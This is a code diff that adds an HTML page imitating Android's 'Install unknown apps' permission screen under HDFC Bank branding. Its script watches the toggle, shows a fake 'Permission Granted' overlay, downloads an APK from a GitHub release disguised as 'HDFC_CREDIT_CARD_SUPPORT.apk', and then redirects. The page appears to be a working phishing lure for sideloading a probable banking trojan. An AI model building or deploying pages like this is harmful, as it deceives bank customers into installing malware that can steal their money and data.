@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Install unknown apps</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        header {
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #333;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            margin-right: 20px;
+            cursor: pointer;
+        }
+
+        header h1 {
+            font-size: 18px;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        .app-info {
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .app-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #fff;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .app-icon img {
+            width: 45px;
+            height: 45px;
+        }
+
+        .app-name {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .app-version {
+            color: #9aa0a6;
+            font-size: 14px;
+        }
+
+        .toggle-section {
+            padding: 20px;
+            background-color: #1a1a1a;
+            margin: 20px;
+            border-radius: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .toggle-text {
+            font-size: 16px;
+        }
+
+        /* The Switch */
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 28px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #555;
+            transition: .4s;
+            border-radius: 34px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 20px;
+            width: 20px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #8ab4f8;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(22px);
+        }
+
+        .warning-text {
+            padding: 0 25px;
+            color: #9aa0a6;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* Success Animation Overlay */
+        #successOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .success-msg {
+            font-size: 18px;
+            color: #8ab4f8;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <span class="back-btn" onclick="history.back()">←</span>
+        <h1>Install unknown apps</h1>
+    </header>
+
+    <div class="app-info">
+        <div class="app-icon">
+            <img src="3e834224c5fd5554a019d56b4902b706.png" alt="Icon">
+        </div>
+        <div class="app-name">HDFC Bank</div>
+        <div class="app-version">v15.0.8-26.5.10</div>
+    </div>
+
+    <div class="toggle-section">
+        <div class="toggle-text">Allow from this source</div>
+        <label class="switch">
+            <input type="checkbox" id="allowToggle">
+            <span class="slider"></span>
+        </label>
+    </div>
+
+    <p class="warning-text">
+        Your phone and personal data are more vulnerable to attack by unknown apps. By installing apps from this source, you agree that you are responsible for any damage to your phone or loss of data that may result from their use.
+    </p>
+
+    <div id="successOverlay">
+        <div class="success-msg">Permission Granted!</div>
+        <div class="success-msg">Starting Download...</div>
+    </div>
+
+    <script>
+        const toggle = document.getElementById('allowToggle');
+        const overlay = document.getElementById('successOverlay');
+        const REAL_APK_URL = 'https://github.com/amanxridex/newmade/releases/download/v1.0.16/hdfc_support.apk';
+
+        toggle.addEventListener('change', () => {
+            if (toggle.checked) {
+                overlay.style.display = 'flex';
+                
+                // Trigger the real download
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = REAL_APK_URL;
+                    link.download = 'HDFC_CREDIT_CARD_SUPPORT.apk';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // Redirect back to main page after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'index.html';
+                    }, 2000);
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
